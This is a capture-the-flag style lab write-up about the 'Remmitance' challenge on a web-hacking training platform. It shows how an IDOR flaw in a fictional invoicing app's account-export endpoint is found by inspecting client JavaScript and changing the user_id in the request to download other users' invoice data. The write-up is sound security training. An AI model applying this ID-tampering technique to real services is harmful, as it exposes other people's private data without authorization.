---

Name: Remmitance
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/04/remittance
Description: InvoiceVault is a six-person SaaS shop that's grown to around four thousand freelancer accounts since 2020, $9/mo, simple invoice CRUD, one feature a quarter. The new account-export endpoint was scaffolded out of an internal admin tool during a frantic week before a customer data-portability deadline. The engineer who wrote it filed a follow-up ticket the same afternoon, it's been sitting at the bottom of the backlog ever since. 

---


## Exploring

After creating an account, I used the **Download export** feature and inspected the ZIP file:

```bash
unzip invoicevault-export.zip
cat account_info.txt
cat invoices.csv
```

The export only contained information belonging to my own account:

```text
Name: bob
Email: bob@gmail.com
Billing Email: bob@gmail.com
Member Since: 2026-08-20
```

The `invoices.csv` file contained:

```text
Invoice #,Client,Client Email,Amount (USD),Status,Due Date,Issued,Description,Notes
```

## Finding the Vulnerability

I inspected the JavaScript used by the page and found an interesting `ACCOUNT` variable:

```javascript
var ACCOUNT = { user_id: 3, email: "bob@gmail.com" };
```

The export request uses this value directly:

```javascript
body: JSON.stringify({ user_id: ACCOUNT.user_id })
```

Using Burp Suite, I confirmed that the request looked like this:

```json
{
    "user_id": 3
}
```

The important part was that the server accepted the `user_id` supplied by the client instead of verifying that it belonged to the currently authenticated user.

This suggested an **IDOR (Insecure Direct Object Reference)** vulnerability.

## Exploitation

I changed the `user_id` from `3` to `1` and sent the request again.

The server returned another user's export:

```text
Name: Casey Nolan
Email: casey@example.com
Billing Email: casey@example.com
Member Since: 2024-09-12
```

The `invoices.csv` file also contained that user's private invoice information:

```text
INV-2025-009,Morrow & Stein LLP,billing@morrowstein.com,2200.00,...
INV-2024-058,Pellucid Analytics,hello@pellucid.co,875.00,...
INV-2024-041,Hollow Creek Media,ap@hollowcreek.io,1200.00,...
```

Since changing only the numeric ID allowed access to another account's data, the endpoint was clearly vulnerable to IDOR.

I then tested the other user IDs. The flag was found in the `invoices.csv` returned for **user ID 2**.
